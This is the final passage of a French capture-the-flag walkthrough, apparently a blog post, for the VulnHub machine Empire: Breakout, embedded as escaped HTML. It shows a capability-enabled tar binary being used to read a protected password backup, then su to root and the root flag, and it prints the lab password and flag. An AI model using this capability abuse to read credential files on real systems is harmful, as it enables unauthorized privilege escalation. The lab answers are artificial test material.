class=\"token operator\"\u003E=\u003C\u002Fspan\u003Eep\u003C\u002Fcode\u003E\u003Cspan aria-hidden=\"true\" class=\"line-numbers-rows\" style=\"white-space: normal; width: auto; left: 0;\"\u003E\u003Cspan\u003E\u003C\u002Fspan\u003E\u003Cspan\u003E\u003C\u002Fspan\u003E\u003C\u002Fspan\u003E\u003C\u002Fpre\u003E\u003C\u002Fdiv\u003E\n\u003Cp\u003ECette \u003Ca href=\"https:\u002F\u002Fbook.hacktricks.xyz\u002Flinux-unix\u002Fprivilege-escalation\u002Flinux-capabilities#example-with-binary-3\" target=\"_blank\" rel=\"nofollow noopener noreferrer\"\u003Eoption\u003C\u002Fa\u003E signifie que le binaire sera capable de lire n'importe quel fichier. Cela tombe √† pic car dans le dossier \"\u002Fvar\u002Fbackups\", on a un fichier que l'on voudrait pouvoir lire \".old_pass.bak\" car on n'a pas les droits de lecture.\u003C\u002Fp\u003E\n\u003Cdiv class=\"gridsome-highlight\" data-language=\"bash\"\u003E\u003Cpre style=\"counter-reset: linenumber NaN\" class=\"language-bash line-numbers\"\u003E\u003Ccode class=\"language-bash\"\u003E$ .\u002Ftar -cf back.tar \u002Fvar\u002Fbackups\u002F.old_pass.bak\n$ \u003Cspan class=\"token function\"\u003Etar\u003C\u002Fspan\u003E -xf back.tar\n$ \u003Cspan class=\"token function\"\u003Els\u003C\u002Fspan\u003E\nback.tar  \u003Cspan class=\"token function\"\u003Etar\u003C\u002Fspan\u003E  user.txt  var\u003C\u002Fcode\u003E\u003Cspan aria-hidden=\"true\" class=\"line-numbers-rows\" style=\"white-space: normal; width: auto; left: 0;\"\u003E\u003Cspan\u003E\u003C\u002Fspan\u003E\u003Cspan\u003E\u003C\u002Fspan\u003E\u003Cspan\u003E\u003C\u002Fspan\u003E\u003Cspan\u003E\u003C\u002Fspan\u003E\u003C\u002Fspan\u003E\u003C\u002Fpre\u003E\u003C\u002Fdiv\u003E\n\u003Cp\u003ELe dossier \"var\" a √©t√© cr√©√© et on peut lire son contenu.\u003C\u002Fp\u003E\n\u003Cdiv class=\"gridsome-highlight\" data-language=\"bash\"\u003E\u003Cpre style=\"counter-reset: linenumber NaN\" class=\"language-bash line-numbers\"\u003E\u003Ccode class=\"language-bash\"\u003E$ \u003Cspan class=\"token function\"\u003Ecat\u003C\u002Fspan\u003E var\u002Fbackups\u002F.old_pass.bak\nTs\u003Cspan class=\"token operator\"\u003E&amp;\u003C\u002Fspan\u003E\u003Cspan class=\"token number\"\u003E4\u003C\u002Fspan\u003E\u003Cspan class=\"token operator\"\u003E&amp;\u003C\u002Fspan\u003EYurgtRX\u003Cspan class=\"token punctuation\"\u003E(\u003C\u002Fspan\u003E\u003Cspan class=\"token operator\"\u003E=\u003C\u002Fspan\u003E~h\u003C\u002Fcode\u003E\u003Cspan aria-hidden=\"true\" class=\"line-numbers-rows\" style=\"white-space: normal; width: auto; left: 0;\"\u003E\u003Cspan\u003E\u003C\u002Fspan\u003E\u003Cspan\u003E\u003C\u002Fspan\u003E\u003C\u002Fspan\u003E\u003C\u002Fpre\u003E\u003C\u002Fdiv\u003E\n\u003Cp\u003EComme convenu, il contient un mot de passe, ce qui nous permet de nous connecter en tant qu'utilisateur \"root\".\u003C\u002Fp\u003E\n\u003Cdiv class=\"gridsome-highlight\" data-language=\"bash\"\u003E\u003Cpre style=\"counter-reset: linenumber NaN\" class=\"language-bash line-numbers\"\u003E\u003Ccode class=\"language-bash\"\u003E$ \u003Cspan class=\"token function\"\u003Esu\u003C\u002Fspan\u003E root\nPassword: Ts\u003Cspan class=\"token operator\"\u003E&amp;\u003C\u002Fspan\u003E\u003Cspan class=\"token number\"\u003E4\u003C\u002Fspan\u003E\u003Cspan class=\"token operator\"\u003E&amp;\u003C\u002Fspan\u003EYurgtRX\u003Cspan class=\"token punctuation\"\u003E(\u003C\u002Fspan\u003E\u003Cspan class=\"token operator\"\u003E=\u003C\u002Fspan\u003E~h\n$ \u003Cspan class=\"token function\"\u003Eid\u003C\u002Fspan\u003E\n\u003Cspan class=\"token assign-left variable\"\u003Euid\u003C\u002Fspan\u003E\u003Cspan class=\"token operator\"\u003E=\u003C\u002Fspan\u003E\u003Cspan class=\"token number\"\u003E0\u003C\u002Fspan\u003E\u003Cspan class=\"token punctuation\"\u003E(\u003C\u002Fspan\u003Eroot\u003Cspan class=\"token punctuation\"\u003E)\u003C\u002Fspan\u003E \u003Cspan class=\"token assign-left variable\"\u003Egid\u003C\u002Fspan\u003E\u003Cspan class=\"token operator\"\u003E=\u003C\u002Fspan\u003E\u003Cspan class=\"token number\"\u003E0\u003C\u002Fspan\u003E\u003Cspan class=\"token punctuation\"\u003E(\u003C\u002Fspan\u003Eroot\u003Cspan class=\"token punctuation\"\u003E)\u003C\u002Fspan\u003E \u003Cspan class=\"token assign-left variable\"\u003Egroups\u003C\u002Fspan\u003E\u003Cspan class=\"token operator\"\u003E=\u003C\u002Fspan\u003E\u003Cspan class=\"token number\"\u003E0\u003C\u002Fspan\u003E\u003Cspan class=\"token punctuation\"\u003E(\u003C\u002Fspan\u003Eroot\u003Cspan class=\"token punctuation\"\u003E)\u003C\u002Fspan\u003E\u003C\u002Fcode\u003E\u003Cspan aria-hidden=\"true\" class=\"line-numbers-rows\" style=\"white-space: normal; width: auto; left: 0;\"\u003E\u003Cspan\u003E\u003C\u002Fspan\u003E\u003Cspan\u003E\u003C\u002Fspan\u003E\u003Cspan\u003E\u003C\u002Fspan\u003E\u003Cspan\u003E\u003C\u002Fspan\u003E\u003C\u002Fspan\u003E\u003C\u002Fpre\u003E\u003C\u002Fdiv\u003E\n\u003Cp\u003EEt on trouve rapidement le second et dernier flag.\u003C\u002Fp\u003E\n\u003Cdiv class=\"gridsome-highlight\" data-language=\"bash\"\u003E\u003Cpre style=\"counter-reset: linenumber NaN\" class=\"language-bash line-numbers\"\u003E\u003Ccode class=\"language-bash\"\u003E$ \u003Cspan class=\"token builtin class-name\"\u003Ecd\u003C\u002Fspan\u003E ~\n$ \u003Cspan class=\"token function\"\u003Ecat\u003C\u002Fspan\u003E rOOt.txt\n3mp\u003Cspan class=\"token operator\"\u003E!\u003C\u002Fspan\u003Er3\u003Cspan class=\"token punctuation\"\u003E{\u003C\u002Fspan\u003EYou_Manage_To_BreakOut_From_My_System_Congratulation\u003Cspan class=\"token punctuation\"\u003E}\u003C\u002Fspan\u003E\u003C\u002Fcode\u003E\u003Cspan aria-hidden=\"true\" class=\"line-numbers-rows\" style=\"white-space: normal; width: auto; left: 0;\"\u003E\u003Cspan\u003E\u003C\u002Fspan\u003E\u003Cspan\u003E\u003C\u002Fspan\u003E\u003Cspan\u003E\u003C\u002Fspan\u003E\u003C\u002Fspan\u003E\u003C\u002Fpre\u003E\u003C\u002Fdiv\u003E\n","download":"https:\u002F\u002Fwww.vulnhub.com\u002Fentry\u002Fempire-breakout,751","tags":[{"title":"Pentest","path":"\u002Ftag\u002FPentest\u002F"},{"title":"CTF","path":"\u002Ftag\u002FCTF\u002F"}],"timeToRead":3,"parts":[]}},"context":{}};(function(){var s;(s=document.currentScript||document.scripts[document.scripts.length-1]).parentNode.removeChild(s);}());</script><script src="/assets/js/app.50d8a5ce.js" defer></script><script src="/assets/js/page--src-templates-post-vue.56e5bc07.js" defer></script>
  </body>
</html>
